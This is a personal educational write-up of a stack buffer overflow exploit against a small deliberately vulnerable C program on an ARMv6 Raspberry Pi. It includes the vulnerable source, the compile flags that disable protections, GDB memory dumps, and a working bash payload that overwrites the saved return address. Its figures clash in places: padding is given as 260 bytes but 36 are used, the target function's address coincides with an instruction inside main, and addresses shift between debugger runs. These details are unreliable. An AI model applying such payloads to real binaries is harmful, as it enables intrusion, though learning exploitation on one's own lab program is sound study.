# Buffer overflow exploit

**Note**: This is simply a write-up for myself, so that I solidify my
understanding of the subject.

I have heard before that just by writing memory-safe software one can get rid
of most of the vulnerabilities for free. But I never actually went to
investigate how bad these memory exploits are. So let's try *smashing the
stack*, shall we.

Smashing the stack stands for this exploit where we overwrite parts of the
stack that are are still in use and hold otherwise useful data for the program.
We can achieve this by overflowing buffers.

## Hardware

I am using a Rasperry Pi B+ model to run this. That means I am working with the
ARMv6l architecture. I was following [this
guide](https://learn.arm.com/learning-paths/servers-and-cloud-computing/exploiting-stack-buffer-overflow-aarch64/)
from ARM that was written for Arm64 (for aarch64, if you will). The differences
are not *that* big and most of the concepts carry over, but the assembly for
these architectures is definitely different.

## Code

We will try to exploit the following [code](./vuln.c):

```c
#include <stdio.h>
#include <string.h>

#define BUF_SIZE 32

int main(int argc, char **argv) {
    char buf[BUF_SIZE];

    if (argc < 2) {
        printf("Usage: vuln <input>\n");
        return 1;
    }

    strcpy(buf, argv[1]);

    return 0;
}

void unused_function(void) {
    printf("Pwned.\n");
}
```

Our goal is to execute `unused_function` just by using the
compiled binary. That is, we will try to make the program execute
`unused_function` by passing in a carefully handcrafted argument.

## Steps

### Compile the Vulnerable Program

First we need to compile the source code `vuln.c`.

```sh
gcc -O0 -g -no-pie vuln.c -o vuln
```

I have a [makefile](./Makefile) with this command set up,
so that I can just run `make`, and have everything
figured out for me.

### Find the Address of the Hidden Function

We disabled all optimizations with `-O0`. This is very
handy if we want a closer relationship between the C
source code and the machine code.

We also disable PIE, which stands for Position
Independent Executable. PIE is a precondition for ASLR
(Address Space Layout Randomization), which is a
security feature that would render our efforts futile.

Now we inspect the binary for the address of
`unused_function`. This is a bit of manual labour, but
it's good enough for our intents and purposes. If ASLR
was enabled, then manually looking up the address would
not cut it. But I want the situation to be as simple as
possible so we will just have it disabled.

We can inspect it with `objdump`, which can disassemble
it for us, and makes it easy to look up the addresses.

```sh
objdump -d ./vuln | less
```

Alternatively, just run the following.

```sh
objdump -d ./vuln | grep unused_function
```

You should see a couple lines that match the pattern.
One of them (probably the first) will look like this:

```dump
00010494 <unused_function>:
```

This means that the address of `unused_function` is
`00010494`. This is a hexadecimal number. Maybe it would
be clearer if I wrote it as `0x00010494`.

### Explore with GDB

This is a fun step. We will just poke around a bit.

First let's start GDB.

```sh
gdb --args ./vuln 12345678
```

Then we will very quickly drop a breakpoint in `main`
and look at its corresponding assembly.

```gdb
(gdb) break main
Breakpoint 1 at 0x104a8
(gdb) run
Starting program: /path/to/vuln 12345678

Breakpoint 1, 0x000104a8 in main ()
(gdb) disassemble
Dump of assembler code for function main:
   0x00010490 <+0>:     push    {r11, lr}
   0x00010494 <+4>:     add     r11, sp, #4
   0x00010498 <+8>:     sub     sp, sp, #40     ; 0x28
   0x0001049c <+12>:    str     r0, [r11, #-40]         ; 0xffffffd8
   0x000104a0 <+16>:    str     r1, [r11, #-44]         ; 0xffffffd4
   0x000104a4 <+20>:    ldr     r3, [r11, #-40]         ; 0xffffffd8
=> 0x000104a8 <+24>:    cmp     r3, #1
[...]
```

Nice, now we can look at the exact addresses of the
instructions in `main` alongside where we are in the
program. Further down we see a line that is of our interest.

```gdb
   [...]
   0x000104e8 <+88>:    bl      0x10364 <strcpy@plt>
   [...]
```

Indeed it is the call to `strcpy`, the call that enables
this exploit. Let's just set a breakpoint there and jump
to it. This is just before executing that line.

```gdb
(gdb) break *0x000104e8
Breakpoint 2 at 0x104e8
(gdb) c
Continuing.

Breakpoint 2, 0x000104e8 in main ()
(gdb) disassemble
[...]
   0x000104e0 <+80>:    mov     r1, r2
   0x000104e4 <+84>:    mov     r0, r3
=> 0x000104e8 <+88>:    bl      0x10364 <strcpy@plt>
   0x000104ec <+92>:    mov     r3, #0
   0x000104f0 <+96>:    mov     r0, r3
   0x000104f4 <+100>:   sub     sp, r11, #4
   0x000104f8 <+104>:   pop     {r11, pc}
[...]
```

Now it's time to poke around in the memory. Let's just
print a couple words around the Stack Pointer. Since the
buffer is allocated in this function, it should be close
to the top of the stack (which expands in the negative
direction).

```gdb
(gdb) info registers sp
sp             0xbefff4d8          0xbefff4d8
(gdb) x/32wx $sp
0xbefff4d8:     0xbefff664      0x00000002      0xb6fb7020       0x000104d8
0xbefff4e8:     0x000104b0      0x00000000      0x00010344       0x00000000
0xbefff4f8:     0x00000000      0x00000000      0x00000000       0xb6e7d740
0xbefff508:     0xb6fb5000      0xbefff664      0x00000002       0x00010434
0xbefff518:     0x5bf80c03      0x53e02fff      0x000104b0       0x00000000
0xbefff528:     0x00010344      0x00000000      0x00000000       0x00000000
0xbefff538:     0xb6fff000      0x00000000      0x00000000       0x00000000
0xbefff548:     0x00000000      0x00000000      0x00000000       0x00000000
```

That seems like a very lucky chunk of uninitialized
memory. Mostly zeros. But this could be all random
characters too.

At the very top of the stack we have one word that is
suspiciously non-zero. And that is for a good reason. It
stores the address to `argv`. We can see it at the
beginning of `main`, where it is stored there:

```gdb
   0x000104a0 <+16>:    str     r1, [r11, #-44]        ; 0xffffffd4
```

Here, `r1` refers to the *2nd* arguments of `main`. The
first argument is of course `r0`. Actually, `r0` was
also put on the stack. It is the very next word,
`0x00000002`. This is `argc`.

And there were indeed two arguments passed (the program
itself and the argument we passed it). These are the
only two elements on the stack on top of our buffer. So
the rest of the memory will get overwritten by our
`strcpy`. Well, as many bytes as the argument contained.
Let's check it out:

```gdb
(gdb) nexti
16          return 0;
(gdb) x/32wx $sp
0xbefff4d8:     0xbefff664      0x00000002      0x34333231       0x38373635
0xbefff4e8:     0x00010400      0x00000000      0x00010344       0x00000000
0xbefff4f8:     0x00000000      0x00000000      0x00000000       0xb6e7d740
0xbefff508:     0xb6fb5000      0xbefff664      0x00000002       0x00010434
0xbefff518:     0x5bf80c03      0x53e02fff      0x000104b0       0x00000000
0xbefff528:     0x00010344      0x00000000      0x00000000       0x00000000
0xbefff538:     0xb6fff000      0x00000000      0x00000000       0x00000000
0xbefff548:     0x00000000      0x00000000      0x00000000       0x00000000
```

Two words overridden, just as expected. Except: It also
wrote one byte from the 3rd word, since the argument is
null terminated. That is, it has an additionally 0 byte
at the end of it. We cannot see that here since that
byte was already 0 to begin with.

One important thing to notice though: ARMv6 is little
endian. That is, words are ordered with the least
significant bit first.

```gdb
(gdb) x/32wx $sp
0xbefff4d8:     0xbefff664      0x00000002      0x34333231       0x38373635
0xbefff4e8:     0x00010400      0x00000000      0x00010344       0x00000000
0xbefff4f8:     0x00000000      0x00000000      0x00000000       0xb6e7d740
0xbefff508:     0xb6fb5000      0xbefff664      0x00000002       0x00010434
0xbefff518:     0x5bf80c03      0x53e02fff      0x000104b0       0x00000000
0xbefff528:     0x00010344      0x00000000      0x00000000       0x00000000
0xbefff538:     0xb6fff000      0x00000000      0x00000000       0x00000000
0xbefff548:     0x00000000      0x00000000      0x00000000       0x00000000
(gdb) ni 3
0x0001048c      17      }
(gdb) disassemble 
Dump of assembler code for function main:
[...]
   0x0001047c <+72>:    bl      0x10308 <strcpy@plt>
   0x00010480 <+76>:    mov     r3, #0
   0x00010484 <+80>:    mov     r0, r3
   0x00010488 <+84>:    sub     sp, r11, #4
=> 0x0001048c <+88>:    pop     {r11, pc}
   0x00010490 <+92>:                    ; <UNDEFINED> instruction: 0x000105b0
End of assembler dump.
```

Now we are at an interesting instruction again. This is
the return instruction. Yes. It looks like just a pop.
Because it is.

It simply pops `r11`, which is like the stack base
pointer, and the Program Counter (`pc`) register. The
Program Counter is a pointer to the next instruction
that is to be executed. By overwriting `pc` with the
address right after the function call, we effectively do
a return.

So in the above example, `pc` is `0x0001048c`, as we can see from the
arrow.

```gdb
(gdb) ni
__libc_start_main (main=0xbefff664, argc=-1225043968, 
    argv=0xb6e7d740 <__libc_start_main+276>, 
    init=<optimized out>, 
    fini=0x10510 <__libc_csu_fini>, 
    rtld_fini=0xb6fdd510 <_dl_fini>, 
    stack_end=0xbefff664) at libc-start.c:342
342     libc-start.c: No such file or directory.
(gdb) info registers sp r11 pc
sp             0xbefff508          0xbefff508
r11            0x0                 0
pc             0xb6e7d740          0xb6e7d740 <__libc_start_main+276>
```

Alright, so after the return `pc` gets set to
`0xb6e7d740`. We do not particularly care about where
this address points to. What we are interested in
however, is where this value was on the stack.

While this could have been figured out just by reading
the assembly, this is a good way to verify that too.

After searching for `0xb6e7d740` among the words near the
stack pointer around the stack frame of `main`, we found it:

```gdb
0xbefff4f8:     0x00000000      0x00000000      0x00000000       0xb6e7d740
```

### The Exploit Plan

There it is. It looks like the address of it was
`0xbefff504`. From this we can derive how far away it is
from our buffer. It looks like the distance is 9 words,
or equivalently 36 bytes.

So here is how we can exploit this program: Make our
input have 260 bytes of whatever followed by the address
of `unused_function`. Then executing `strcpy` will
overwrite the stored `pc`, so after executing the
return, pc will point to the start of `unused_function`,
so it will execute its contents.

Well, we already the have the address of
`unused_function`. It is `0x00010494`.

Alright, let's pad it with 260 bytes of garbage. I used
GHCi to not have to manually type that out, but choose
whatever option you like the best.

```sh
$ ghci -e 'take 36 $ cycle "12345678"'
"123456781234567812345678123456781234"
```

To add the address to the end of our string we need to
hex escape then in whatever language we choose. I am
just going to use some bash magic to pass it as an
argument.

```sh
$ ./vuln $(echo -e '123456781234567812345678123456781234\x94\x04\x01\x00')
-bash: warning: command substitution: ignored null byte in input
Pwned.
Segmentation fault
$ echo $?
139
```

Luckily, I do not care that the program does not exit
gracefully. It works, our exploit was successful.

Please note that I flipped the bytes in the address
`0x00010494`. That is, I put `\x94\x04\x01\x00` instead
of `\x00\x01\x04\x94`. This is essential. Remember? It
was little endian. This is what would have happened if I
didn't reverse it:

```sh
$ ./vuln $(echo -e '12345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234\x00\x01\x05\x04')
-bash: warning: command substitution: ignored null byte in input
Segmentation fault
```

Exercise to the reader: Step through GDB and check what
addresses and what registers get overwritten at what
point.